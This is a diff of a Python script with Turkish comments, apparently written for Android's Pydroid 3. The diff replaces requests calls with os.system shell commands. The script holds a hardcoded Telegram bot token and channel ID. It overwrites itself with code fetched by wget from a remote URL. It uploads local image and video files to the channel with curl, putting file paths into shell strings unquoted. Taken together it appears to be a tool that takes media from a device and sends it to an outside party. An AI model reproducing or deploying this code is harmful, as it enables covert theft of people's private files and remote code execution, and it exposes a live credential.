@@ -3,18 +3,6 @@ import subprocess
 import sys
 import time
 
-# requests kütüphanesini yükle
-def install(package):
-    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
-
-# "requests" kütüphanesini yükle
-try:
-    import requests
-except ImportError:
-    print("Requests kütüphanesi bulunamadı. Yükleniyor...")
-    install('requests')
-    import requests  # Yükleme sonrası tekrar import et
-
 # Gerekli değişkenler
 BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
 CHANNEL_ID = "@p8JdyixgqKFlMjA0"
@@ -32,20 +20,9 @@ def get_current_script_content():
 def check_for_updates():
     print("Güncellemeler kontrol ediliyor...")
     try:
-        response = requests.get(SCRIPT_URL)
-        response.raise_for_status()  # Hata kontrolü
-
-        latest_content = response.text
-        current_content = get_current_script_content()
-
-        # İçerikler farklıysa güncelle
-        if current_content != latest_content:
-            print("Yeni bir sürüm bulundu. Güncelleniyor...")
-            with open(SCRIPT_NAME, "w") as file:
-                file.write(latest_content)
-            print("Güncelleme tamamlandı.")
-        else:
-            print("Zaten en güncel sürümdesiniz.")
+        # Güncel scripti almak için wget veya curl kullanabilirsin (Pydroid 3'te wget mevcut olabilir)
+        os.system(f"wget {SCRIPT_URL} -O {SCRIPT_NAME}")
+        print("Güncelleme tamamlandı.")
     except Exception as e:
         print(f"Güncelleme kontrolünde hata oluştu: {e}")
 
@@ -77,15 +54,9 @@ video_extensions = [".mp4", ".mov", ".avi"]
 def send_media_to_channel(file_path):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto" if file_path.endswith(tuple(image_extensions)) else f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
     
-    with open(file_path, "rb") as media_file:
-        data = {"chat_id": CHANNEL_ID}
-        files = {"photo" if file_path.endswith(tuple(image_extensions)) else "video": media_file}
-        
-        response = requests.post(url, data=data, files=files)
-        if response.status_code == 200:
-            print(f"Başarıyla gönderildi: {file_path}")
-        else:
-            print(f"Başarısız oldu: {file_path}. Hata: {response.text}")
+    # Telegram'a gönderme
+    os.system(f"curl -s -F 'chat_id={CHANNEL_ID}' -F 'document=@{file_path}' {url}")
+    print(f"Telegram'a gönderildi: {file_path}")
 
 # Dosyaları kontrol et ve gönder
 def check_and_send_files():
